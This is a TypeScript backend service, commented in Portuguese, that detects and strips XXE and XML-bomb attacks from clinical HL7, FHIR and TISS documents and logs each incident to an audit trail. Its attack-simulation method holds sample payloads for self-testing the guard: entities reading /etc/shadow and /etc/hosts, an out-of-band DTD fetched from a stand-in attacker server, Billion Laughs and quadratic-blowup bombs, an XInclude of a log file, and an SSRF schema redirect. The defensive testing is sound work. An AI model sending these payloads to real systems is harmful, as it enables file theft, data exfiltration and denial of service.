/**
 * ============================================================================
 * 64. BACKEND SERVICE: XML SECURITY GUARD & ENTITY EXPANSION DEFENSE ENCLAVE
 * ============================================================================
 * 
 * Enclave de detecção e prevenção ativa de ataques de injeção de entidades
 * externas XML (XXE - CWE-611) e expansão explosiva de entidades (CWE-776,
 * Billion Laughs, Quadratic Blowup) em intercâmbios HL7 CDA, FHIR e TISS.
 * Registro mandatório em trilha de auditoria WORM imutável.
 */

import { randomUUID } from 'node:crypto';
import {
  XmlThreatType,
  XmlThreatSeverity,
  XmlSanitizationMode,
  XmlClinicalSchemaType,
  AuditAction,
  AuditResourceType,
  type XmlThreatDetection,
  type XmlProofSeal,
  type XmlSanitizationResult,
  type XmlGuardPolicy,
  type XmlGuardMetrics,
  type XmlSecurityIncident,
  type XmlGuardOverview,
  type ScanXmlPayloadDTO,
  type ScanXmlPayloadResponse,
  type SimulateXmlAttackDTO,
  type SimulateXmlAttackResponse,
  type UpdateXmlPolicyDTO,
  type UpdateXmlPolicyResponse,
  type VerifyXmlSealDTO,
  type VerifyXmlSealResponse
} from '@terapiainfoco/shared';
import {
  DEFAULT_XML_GUARD_POLICY,
  scanAndSanitizeXml,
  verifyXmlProofSeal
} from '@terapiainfoco/crypto';
import { AuditService } from './auditService';

export class XmlSecurityGuardService {
  private static instance: XmlSecurityGuardService;

  private policy: XmlGuardPolicy = { ...DEFAULT_XML_GUARD_POLICY };
  private incidents: XmlSecurityIncident[] = [];
  private sealsMap: Map<string, XmlProofSeal> = new Map();
  private metrics: XmlGuardMetrics = {
    totalXmlDocumentsScanned: 0,
    xxeAttacksBlocked: 0,
    xmlBombsDefused: 0,
    cleanDocumentsProcessed: 0,
    averageScanLatencyMs: 0.8,
    activePolicy: { ...DEFAULT_XML_GUARD_POLICY },
    lastIncidentTimestamp: null
  };

  private readonly supportedSchemas: XmlClinicalSchemaType[] = [
    XmlClinicalSchemaType.HL7_CDA_R2,
    XmlClinicalSchemaType.FHIR_XML_R4,
    XmlClinicalSchemaType.TISS_CLINICAL_GUIDE,
    XmlClinicalSchemaType.CUSTOM_EMR_EXPORT
  ];

  private constructor() {
    this.seedInitialHistoricalMetrics();
  }

  public static getInstance(): XmlSecurityGuardService {
    if (!XmlSecurityGuardService.instance) {
      XmlSecurityGuardService.instance = new XmlSecurityGuardService();
    }
    return XmlSecurityGuardService.instance;
  }

  private seedInitialHistoricalMetrics(): void {
    const seedIncident: XmlSecurityIncident = {
      id: randomUUID(),
      timestamp: new Date(Date.now() - 3600000 * 3).toISOString(),
      threatType: XmlThreatType.EXTERNAL_ENTITY_SYSTEM,
      severity: XmlThreatSeverity.CRITICAL,
      schemaType: XmlClinicalSchemaType.HL7_CDA_R2,
      clientIp: '198.51.100.89',
      actorId: 'adversary-scanner-probe',
      evidence: '<!ENTITY xxe SYSTEM "file:///etc/passwd"> detectado no cabeçalho DTD do documento CDA.',
      actionTaken: 'Bloqueio preventivo e eliminação de DTD com emissão de selo WORM',
      seal: {
        version: '1.0.0',
        sealId: 'xml_guard_v1_seed_init_probe',
        timestamp: new Date(Date.now() - 3600000 * 3).toISOString(),
        canonicalXmlHash: 'c66f7f6314f3b23612d1b827e69c676ec4ec1f391b16254425642a843c08f1c8',
        cleanDigest: 'a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e',
        threatsCount: 1,
        schemaType: XmlClinicalSchemaType.HL7_CDA_R2,
        hmacSignature: 'sig_seed_xml_guard_initial'
      }
    };

    this.incidents.push(seedIncident);
    this.sealsMap.set(seedIncident.seal.sealId, seedIncident.seal);
    this.metrics.totalXmlDocumentsScanned = 86;
    this.metrics.xxeAttacksBlocked = 1;
    this.metrics.xmlBombsDefused = 0;
    this.metrics.cleanDocumentsProcessed = 85;
    this.metrics.averageScanLatencyMs = 1.2;
    this.metrics.lastIncidentTimestamp = seedIncident.timestamp;
  }

  public getOverview(): XmlGuardOverview {
    return {
      metrics: {
        ...this.metrics,
        activePolicy: { ...this.policy }
      },
      policy: { ...this.policy },
      recentIncidents: [...this.incidents].reverse().slice(0, 50),
      supportedSchemas: [...this.supportedSchemas]
    };
  }

  public async scanPayload(
    dto: ScanXmlPayloadDTO,
    clientIp: string = '127.0.0.1',
    actorId: string = 'system-client'
  ): Promise<ScanXmlPayloadResponse> {
    const startTime = performance.now();
    const schemaType = dto.schemaType || XmlClinicalSchemaType.HL7_CDA_R2;
    const mode = dto.mode || XmlSanitizationMode.STRIP_DTD_AND_PARSE;

    const result = scanAndSanitizeXml(
      dto.xmlPayload,
      schemaType,
      mode,
      this.policy
    );

    // Registra selo gerado no cache em memória
    this.sealsMap.set(result.seal.sealId, result.seal);

    const latencyMs = Math.round((performance.now() - startTime) * 100) / 100;
    this.metrics.totalXmlDocumentsScanned++;
    this.metrics.averageScanLatencyMs = Math.round(((this.metrics.averageScanLatencyMs * (this.metrics.totalXmlDocumentsScanned - 1) + latencyMs) / this.metrics.totalXmlDocumentsScanned) * 100) / 100;

    let message = 'Documento XML clínico validado e em conformidade estrutural.';

    if (!result.isSafe) {
      const isBomb = result.threats.some(
        t => t.threatType === XmlThreatType.BILLION_LAUGHS_BOMB || t.threatType === XmlThreatType.QUADRATIC_BLOWUP
      );
      const isXInclude = result.threats.some(t => t.threatType === XmlThreatType.XINCLUDE_ATTACK);

      if (isBomb) {
        this.metrics.xmlBombsDefused++;
      } else {
        this.metrics.xxeAttacksBlocked++;
      }
      this.metrics.lastIncidentTimestamp = new Date().toISOString();

      const incident: XmlSecurityIncident = {
        id: randomUUID(),
        timestamp: new Date().toISOString(),
        threatType: result.threats[0]?.threatType || XmlThreatType.EXTERNAL_ENTITY_SYSTEM,
        severity: result.threats[0]?.severity || XmlThreatSeverity.HIGH,
        schemaType,
        clientIp,
        actorId,
        evidence: result.threats.map(t => `${t.description} [${t.triggerSnippet}]`).join('; '),
        actionTaken: mode === XmlSanitizationMode.STRICT_REJECT
          ? 'Rejeição estrita com interrupção do pipeline de processamento'
          : 'Remoção cirúrgica de DTD/entidades externas e preservação do payload clínico sanitizado',
        seal: result.seal
      };

      this.incidents.push(incident);
      if (this.incidents.length > 50) {
        this.incidents.shift();
      }

      // Auditoria WORM compulsória
      let auditAction = AuditAction.XXE_INJECTION_BLOCKED;
      if (isBomb) {
        auditAction = AuditAction.XML_BOMB_EXPANSION_BLOCKED;
      } else if (isXInclude) {
        auditAction = AuditAction.XINCLUDE_INJECTION_BLOCKED;
      }

      await AuditService.log({
        action: auditAction,
        resourceType: AuditResourceType.XML_SECURITY_GUARD,
        resourceId: incident.id,
        userId: actorId,
        details: {
          threatCount: result.threats.length,
          threats: result.threats,
          schemaType,
          mode,
          clientIp,
          maxNestingDepth: result.maxNestingDepth,
          expansionMultiplier: result.expansionMultiplier,
          sealId: result.seal.sealId
        }
      });

      message = `Ameaça XML neutralizada com sucesso (${result.threats.length} vetor(es) detectado(s)).`;
    } else {
      this.metrics.cleanDocumentsProcessed++;

      await AuditService.log({
        action: AuditAction.SAFE_XML_NORMALIZED,
        resourceType: AuditResourceType.XML_SECURITY_GUARD,
        resourceId: result.seal.sealId,
        userId: actorId,
        details: {
          schemaType,
          originalDigest: result.seal.canonicalXmlHash,
          sanitizedDigest: result.seal.cleanDigest,
          maxNestingDepth: result.maxNestingDepth
        }
      });
    }

    return {
      success: true,
      result,
      message
    };
  }

  public async updatePolicy(
    dto: UpdateXmlPolicyDTO,
    actorId: string = 'security-officer'
  ): Promise<UpdateXmlPolicyResponse> {
    this.policy = {
      ...this.policy,
      ...dto.policy
    };
    this.metrics.activePolicy = { ...this.policy };

    await AuditService.log({
      action: AuditAction.XML_GUARD_POLICY_UPDATED,
      resourceType: AuditResourceType.XML_SECURITY_GUARD,
      resourceId: 'xml-guard-policy',
      userId: actorId,
      details: {
        updatedFields: Object.keys(dto.policy),
        newPolicy: this.policy
      }
    });

    return {
      success: true,
      policy: { ...this.policy },
      message: 'Política de proteção XML atualizada e registrada na trilha WORM com sucesso.'
    };
  }

  public async simulateAttack(
    dto: SimulateXmlAttackDTO,
    clientIp: string = '127.0.0.1',
    actorId: string = 'pentest-analyst'
  ): Promise<SimulateXmlAttackResponse> {
    let payload = dto.customPayload;
    const schemaType = dto.schemaType || XmlClinicalSchemaType.HL7_CDA_R2;

    if (!payload) {
      switch (dto.attackType) {
        case XmlThreatType.EXTERNAL_ENTITY_SYSTEM:
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ClinicalDocument [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<ClinicalDocument xmlns="urn:hl7-org:v3">
  <id extension="SIM-XXE-01" root="2.16.840.1.113883.3.72"/>
  <title>Relatório Psiquiátrico com XXE &xxe;</title>
</ClinicalDocument>`;
          break;

        case XmlThreatType.PARAMETER_ENTITY_INJECTION:
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ClinicalDocument [
  <!ENTITY % oob SYSTEM "http://attacker-exfiltration-server.org/eval.dtd">
  %oob;
]>
<ClinicalDocument xmlns="urn:hl7-org:v3">
  <title>Prontuário com OOB Exfiltration</title>
</ClinicalDocument>`;
          break;

        case XmlThreatType.BILLION_LAUGHS_BOMB:
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bomb [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<bomb>&lol3;</bomb>`;
          break;

        case XmlThreatType.QUADRATIC_BLOWUP: {
          const huge = 'A'.repeat(50000);
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE quad [
  <!ENTITY huge "${huge}">
]>
<quad>&huge;&huge;&huge;&huge;&huge;</quad>`;
          break;
        }

        case XmlThreatType.XINCLUDE_ATTACK:
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///var/log/system.log" parse="text"/>
</ClinicalDocument>`;
          break;

        case XmlThreatType.EXTERNAL_SCHEMA_REDIRECTION:
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:hl7-org:v3 http://internal-vault.corp.local/schema.xsd">
  <title>Documento com Redirecionamento SSRF de Schema</title>
</ClinicalDocument>`;
          break;

        case XmlThreatType.EXCESSIVE_NESTING_DEPTH:
          payload = '<a>'.repeat(30) + '<data>Profundo</data>' + '</a>'.repeat(30);
          break;

        default:
          payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ClinicalDocument [
  <!ENTITY probe SYSTEM "file:///etc/hosts">
]>
<ClinicalDocument>
  <data>&probe;</data>
</ClinicalDocument>`;
          break;
      }
    }

    const scanResponse = await this.scanPayload(
      {
        xmlPayload: payload,
        schemaType,
        mode: XmlSanitizationMode.STRIP_DTD_AND_PARSE
      },
      clientIp,
      actorId
    );

    const threatDetected = !scanResponse.result.isSafe;
    const latestIncident = this.incidents[this.incidents.length - 1];

    return {
      success: true,
      threatDetected,
      incident: threatDetected ? latestIncident : undefined,
      result: scanResponse.result,
      message: threatDetected
        ? `Ataque simulado [${dto.attackType}] detectado e interceptado com sucesso!`
        : `Nenhuma ameaça identificada na simulação [${dto.attackType}].`,
      timestamp: new Date().toISOString()
    };
  }

  public async verifySeal(
    dto: VerifyXmlSealDTO,
    actorId: string = 'auditor'
  ): Promise<VerifyXmlSealResponse> {
    let sealToVerify: any = dto.sealToken;
    if (typeof dto.sealToken === 'string' && this.sealsMap.has(dto.sealToken)) {
      sealToVerify = this.sealsMap.get(dto.sealToken)!;
    }

    const verification = verifyXmlProofSeal(sealToVerify);

    const sealId = verification.parsedSeal?.sealId || (typeof dto.sealToken === 'string' ? dto.sealToken.slice(0, 32) : 'unknown_seal');

    await AuditService.log({
      action: AuditAction.XML_GUARD_SEAL_VERIFIED,
      resourceType: AuditResourceType.XML_SECURITY_GUARD,
      resourceId: sealId,
      userId: actorId,
      details: {
        isValid: verification.isValid,
        reason: verification.reason,
        seal: verification.parsedSeal
      }
    });

    return {
      success: true,
      isValid: verification.isValid,
      seal: verification.parsedSeal,
      message: verification.isValid
        ? 'Selo probatório de integridade XML autêntico e verificado.'
        : `Selo probatório inválido: ${verification.reason}`,
      verifiedAt: new Date().toISOString()
    };
  }
}
